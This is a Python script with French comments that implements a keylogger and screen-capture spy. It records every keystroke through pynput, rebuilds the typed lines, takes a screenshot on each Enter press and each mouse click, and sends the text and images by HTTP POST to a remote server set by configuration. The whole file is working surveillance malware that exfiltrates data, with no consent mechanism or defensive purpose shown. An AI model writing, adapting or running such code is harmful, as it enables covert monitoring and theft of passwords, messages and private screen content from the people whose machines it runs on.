from pynput import keyboard, mouse
from PIL import ImageGrab
import datetime
import requests
import io
import threading
from decouple import config

SERVER_URL = config('SERVER_URL')

lines = [(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "")] 
cursor_pos = [0]  # Liste pour suivre la position du curseur pour chaque ligne
current_line = 0  # Index de la ligne actuelle
image_clipboard = {}

def get_timestamp():
    """Renvoie un timestamp formaté YYYY-MM-DD HH:MM:SS"""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def capture_screen():
    """Capture l'écran et stocke l'image dans un buffer en mémoire (clipboard-like)."""
    image = ImageGrab.grab()
    img_buffer = io.BytesIO()
    image.save(img_buffer, format="PNG")  # Sauvegarde dans le buffer au format PNG
    img_buffer.seek(0)  # Remet le curseur au début du buffer
    return img_buffer

def send_log(text, screenshot=None):
    """Envoie le texte et l'image au serveur"""
    timestamp = get_timestamp()
    
    # Préparer les fichiers à envoyer
    files = {}
    if screenshot:
        files["screenshot"] = ("screenshot.png", screenshot.getvalue(), "image/png")

    data = {"timestamp": timestamp, "text": text}

    try:
        response = requests.post(SERVER_URL, data=data, files=files)
        response.raise_for_status()  # Vérifie si la requête a réussi
        print(f"Log envoyé : {text}")
    except requests.RequestException as e:
        print(f"Erreur lors de l'envoi du log : {e}")

def on_press(key):
    global lines, cursor_pos, current_line

    try:
        timestamp, content = lines[current_line]

        if key == keyboard.Key.left:  # Déplacer le curseur à gauche
            cursor_pos[current_line] = max(0, cursor_pos[current_line] - 1)

        elif key == keyboard.Key.right:  # Déplacer le curseur à droite
            cursor_pos[current_line] = min(len(lines[current_line]), cursor_pos[current_line] + 1)

        elif key == keyboard.Key.backspace:  # Supprimer un caractère
            if cursor_pos[current_line] > 0:
                content = content[:cursor_pos[current_line] - 1] + content[cursor_pos[current_line]:]
                cursor_pos[current_line] -= 1
                lines[current_line] = (timestamp, content)
            elif current_line > 0:  
                prev_timestamp, prev_content = lines[current_line - 1]
                prev_len = len(prev_content)
                lines[current_line - 1] = (prev_timestamp, prev_content + content)
                del lines[current_line]
                del cursor_pos[current_line]
                current_line -= 1
                cursor_pos[current_line] = prev_len

        elif key == keyboard.Key.space:  # Ajouter un espace
            content = content[:cursor_pos[current_line]] + " " + content[cursor_pos[current_line]:]
            cursor_pos[current_line] += 1
            lines[current_line] = (timestamp, content)

        elif key == keyboard.Key.tab:  # Ajouter un \t
            content = content[:cursor_pos[current_line]] + "\t" + content[cursor_pos[current_line]:]
            cursor_pos[current_line] += 1
            lines[current_line] = (timestamp, content)

        elif key == keyboard.Key.enter:  # Ajouter un retour à la ligne
            new_timestamp = get_timestamp() #obtenir le timestamp
            new_line = content[cursor_pos[current_line]:]
            lines[current_line] = (timestamp, content[:cursor_pos[current_line]]) #ajouter le timestamp à la nouvelle ligne 
            lines.insert(current_line + 1, (new_timestamp, new_line))
            cursor_pos.insert(current_line + 1, 0)
            current_line += 1
            img_buffer = capture_screen() # faire la capture d'écran
            image_clipboard[new_timestamp] = img_buffer  #ajouter un timestamp a l'image
            send_log(content, img_buffer)

        elif hasattr(key, 'char') and key.char is not None:  # Ajouter une lettre
            content = content[:cursor_pos[current_line]] + key.char + content[cursor_pos[current_line]:]
            cursor_pos[current_line] += 1
            lines[current_line] = (timestamp, content)

        # Affichage de l'état actuel
        #print("\n".join(lines))
        print(lines)

    except AttributeError:
        pass

def on_release(key):
    pass
    
def on_click(x, y, button, pressed):
    """Capture une image lors d'un clic et l'associe à la dernière ligne."""
    if pressed and lines:
        timestamp = get_timestamp()
        img_buffer = capture_screen()
        image_clipboard[timestamp] = img_buffer  
        send_log('clic',img_buffer)

def start_keyboard_listener():
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

def start_mouse_listener():
    with mouse.Listener(on_click=on_click) as listener:
        listener.join()

# Lancer l'écoute du clavier
keyboard_thread = threading.Thread(target=start_keyboard_listener)
mouse_thread = threading.Thread(target=start_mouse_listener)

keyboard_thread.start()
mouse_thread.start()

keyboard_thread.join()
mouse_thread.join()